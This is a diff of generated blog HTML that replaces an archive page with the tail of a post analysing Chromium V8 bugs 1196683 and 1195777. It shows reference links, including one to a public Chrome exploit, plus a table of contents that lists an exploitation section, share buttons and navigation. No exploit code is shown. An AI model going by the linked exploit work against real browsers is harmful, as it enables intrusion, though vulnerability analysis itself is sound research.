+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://iamelli0t.github.io/2021/04/20/Chromium-Issue-1196683-1195777.html">https://iamelli0t.github.io/2021/04/20/Chromium-Issue-1196683-1195777.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/#control-edges">https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/#control-edges</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/r4j0x00/exploits/blob/master/chrome-0day/exploit.js">https://github.com/r4j0x00/exploits/blob/master/chrome-0day/exploit.js</a></p>
+<p><a target="_blank" rel="noopener" href="https://chromium-review.googlesource.com/c/v8/v8/+/2820971">https://chromium-review.googlesource.com/c/v8/v8/+/2820971</a></p>
+<p><a target="_blank" rel="noopener" href="https://chromium-review.googlesource.com/c/v8/v8/+/2826114">https://chromium-review.googlesource.com/c/v8/v8/+/2826114</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/07/26/geekpwn%E7%BA%BF%E4%B8%8A%E8%B5%9BChildShell/" class="archive-article-date">
-  	<time datetime="2020-07-26T12:00:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/07/26/geekpwn%E7%BA%BF%E4%B8%8A%E8%B5%9BChildShell/">GeekPwn线上初赛ChildShell</a>
-    </h1>
-  
+      
 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2021/11/19/Chromium_issue_1196683_1195777%E5%88%86%E6%9E%90/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/07/15/geekpwn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="archive-article-date">
-  	<time datetime="2020-07-15T14:50:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-15</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2021/11/08/chrome_issue1793%E5%88%86%E6%9E%90/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Chrome issue 1793 分析</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/07/15/geekpwn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">GeekPwn云靶场挑战赛部分题解</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#issue-1196683"><span class="toc-number">2.</span> <span class="toc-text">issue-1196683</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TyperPhase"><span class="toc-number">2.1.</span> <span class="toc-text">TyperPhase</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimplifiedLoweringPhase"><span class="toc-number">2.2.</span> <span class="toc-text">SimplifiedLoweringPhase</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EarlyOptimizationPhase"><span class="toc-number">2.3.</span> <span class="toc-text">EarlyOptimizationPhase</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#schedule"><span class="toc-number">2.4.</span> <span class="toc-text">schedule</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#register-allocation"><span class="toc-number">2.5.</span> <span class="toc-text">register allocation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#issue-1195777"><span class="toc-number">3.</span> <span class="toc-text">issue-1195777</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TyperPhase-1"><span class="toc-number">3.1.</span> <span class="toc-text">TyperPhase</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TypeLoweringPhase"><span class="toc-number">3.2.</span> <span class="toc-text">TypeLoweringPhase</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimplifiedLoweringPhase-1"><span class="toc-number">3.3.</span> <span class="toc-text">SimplifiedLoweringPhase</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/06/01/RCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3_ch/" class="archive-article-date">
-  	<time datetime="2020-06-01T01:17:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-01</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/06/01/RCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3_ch/">RCTF2020部分题解</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/05/12/%E7%A9%BA%E6%8C%87%E9%92%885%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9Bpwn%E9%A2%98%E8%A7%A3/" class="archive-article-date">
-  	<time datetime="2020-05-11T17:12:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-12</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/05/12/%E7%A9%BA%E6%8C%87%E9%92%885%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9Bpwn%E9%A2%98%E8%A7%A3/">空指针5月公开赛pwn题解</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/05/12/Linux-kernel-%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%E8%B8%A9%E5%9D%91%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2020-05-11T16:21:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-12</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/05/12/Linux-kernel-%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%E8%B8%A9%E5%9D%91%E8%AE%B0/">Linux kernel 源码调试踩坑记录</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/05/11/Sudo-CVE-2019-18634-%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
-  	<time datetime="2020-05-11T06:17:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/05/11/Sudo-CVE-2019-18634-%E5%A4%8D%E7%8E%B0/">Sudo CVE-2019-18634 复现</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/04/03/Leetcode_DFA/" class="archive-article-date">
-  	<time datetime="2020-04-03T03:11:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-03</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/04/03/Leetcode_DFA/">DFA</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/19/Suctf2019_sudrv/" class="archive-article-date">
-  	<time datetime="2020-02-19T13:38:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-19</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/19/Suctf2019_sudrv/">Suctf2019_sudrv</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/17/HackTM2020-trip_to_trick/" class="archive-article-date">
-  	<time datetime="2020-02-17T13:19:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-17</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/17/HackTM2020-trip_to_trick/">HackTM2020 trip_to_trick</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/14/Netatalk-CVE-2018-1160-%E5%88%86%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2020-02-14T08:17:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-14</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/14/Netatalk-CVE-2018-1160-%E5%88%86%E6%9E%90/">Netatalk CVE-2018-1160 分析</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/page/2/">Prev</a><a class="page-number" href="/archives/">1</a><a class="page-number" href="/archives/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/archives/page/4/">4</a><a class="extend next" rel="next" href="/archives/page/4/">Next</a>
-    </nav>
   
 
 
@@ -448,8 +408,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
